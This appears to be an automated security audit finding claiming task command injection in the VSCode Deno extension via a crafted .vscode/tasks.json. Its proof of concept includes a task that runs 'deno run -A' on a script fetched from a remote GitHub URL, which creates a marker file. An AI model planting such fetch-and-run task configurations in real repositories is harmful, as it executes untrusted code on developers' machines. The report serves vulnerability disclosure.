### Vulnerability List:

- **Vulnerability Name:** Task Command Injection via Malicious Workspace Configuration

- **Description:**
    1. A threat actor creates a malicious repository containing a `.vscode/tasks.json` file.
    2. This `tasks.json` file defines a Deno task with a malicious command or arguments.
    3. A victim clones or opens this malicious repository in VSCode with the Deno extension enabled.
    4. If the victim executes the malicious task (either manually or automatically if tasks are configured to run on certain events), the commands defined in `tasks.json` will be executed by the system.
    5. If the `tasks.json` contains a command injection vulnerability, arbitrary code can be executed on the victim's machine with the privileges of the VSCode process.

- **Impact:** Remote Code Execution (RCE). An attacker can execute arbitrary commands on the victim's machine, potentially leading to data theft, system compromise, or further malicious activities.

- **Vulnerability Rank:** Critical

- **Currently Implemented Mitigations:**
    - None observed in the provided project files that specifically mitigate command injection in task definitions. The extension relies on VSCode's task execution framework, which inherently trusts the task definitions provided in the workspace.

- **Missing Mitigations:**
    - Input sanitization or validation of task commands and arguments, especially when they are derived from workspace configuration files.
    - User awareness and warnings about executing tasks from untrusted workspaces.
    - Sandboxing or isolation for task execution to limit the impact of malicious commands.
    - Principle of least privilege: Tasks should run with the minimum necessary privileges.

- **Preconditions:**
    - Victim must have the VSCode Deno extension installed and enabled.
    - Victim must open a malicious repository containing a crafted `.vscode/tasks.json` file.
    - Victim must execute the malicious task defined in `tasks.json`. This could be triggered manually by the user via the tasks menu or automatically if configured to run on workspace open or other events.

- **Source Code Analysis:**
    1. **`docs/tasks.md`**: This document describes how to define tasks in `tasks.json`. It shows examples where `command` and `args` are configurable.
    ```markdown
    ```json
    {
      "version": "2.0.0",
      "tasks": [
        {
          "type": "deno",
          "command": "run",
          "args": [
            "mod.ts"
          ],
          "problemMatcher": [
            "$deno"
          ],
          "label": "deno: run"
        }
      ]
    }
    ```
    This shows that `command` and `args` are directly taken from the `tasks.json`.

    2. **`client/src/tasks.ts`**: The `buildDenoTask` function constructs a `vscode.Task` based on the `DenoTaskDefinition`.
    ```typescript
    export function buildDenoTask(
      target: vscode.WorkspaceFolder,
      process: string,
      definition: DenoTaskDefinition,
      name: string,
      args: string[],
      problemMatchers: string[],
    ): vscode.Task {
      const exec = new vscode.ProcessExecution(
        process,
        args, // <-- args are directly passed to ProcessExecution
        definition,
      );

      return new vscode.Task(
        definition,
        target,
        name,
        TASK_SOURCE,
        exec,
        problemMatchers,
      );
    }
    ```
    Here, the `args` array, which can be controlled via `tasks.json`, is directly passed to `vscode.ProcessExecution`. VSCode's `ProcessExecution` will then execute this command. If a malicious user crafts a `tasks.json` with injected commands in `args`, these will be executed.

    3. **`client/src/tasks_sidebar.ts`**: `DenoTasksTreeDataProvider` and `DenoTaskProvider` are responsible for reading and providing tasks, including those from `deno.json` and `tasks.json`. The task execution logic uses the definitions directly without sanitization.

    **Visualization:**

    ```
    Malicious Repository (.vscode/tasks.json) --> VSCode Deno Extension --> tasks.ts (buildDenoTask) --> vscode.ProcessExecution --> System Command Execution (Vulnerable if tasks.json is malicious)
    ```

- **Security Test Case:**
    1. **Setup Malicious Repository:**
        - Create a new directory named `malicious-deno-repo`.
        - Inside `malicious-deno-repo`, create a `.vscode` directory.
        - Inside `.vscode`, create a `tasks.json` file with the following content:
        ```json
        {
          "version": "2.0.0",
          "tasks": [
            {
              "type": "deno",
              "command": "run",
              "args": [
                "-A",
                "-r",
                "https://raw.githubusercontent.com/<your_github_username>/malicious-repo/main/malicious.ts"
              ],
              "label": "Malicious Deno Task"
            }
          ]
        }
        ```
        - Replace `<your_github_username>` with your actual GitHub username.
        - Create a `malicious.ts` file on a public GitHub repository (e.g., `<your_github_username>/malicious-repo`) with the following content. This script will create a file named `pwned.txt` on the victim's system.
        ```typescript
        Deno.writeTextFileSync("pwned.txt", "You have been PWNED by Deno Task Injection!");
        console.log("PWNED!");
        ```
    2. **Victim Setup:**
        - Ensure VSCode with the Deno extension is installed and enabled.
        - Clone the `malicious-deno-repo` repository to a local directory.
        - Open the `malicious-deno-repo` directory in VSCode.
    3. **Execute Malicious Task:**
        - Open the VSCode Command Palette (`Ctrl+Shift+P` or `Cmd+Shift+P`).
        - Type and select "Tasks: Run Task".
        - Select "Malicious Deno Task".
    4. **Verify RCE:**
        - After the task executes, check the `malicious-deno-repo` directory. A file named `pwned.txt` should be present, indicating successful command injection and code execution.

This test case demonstrates that by crafting a malicious `tasks.json` file, an attacker can achieve arbitrary code execution when the victim executes the defined task.
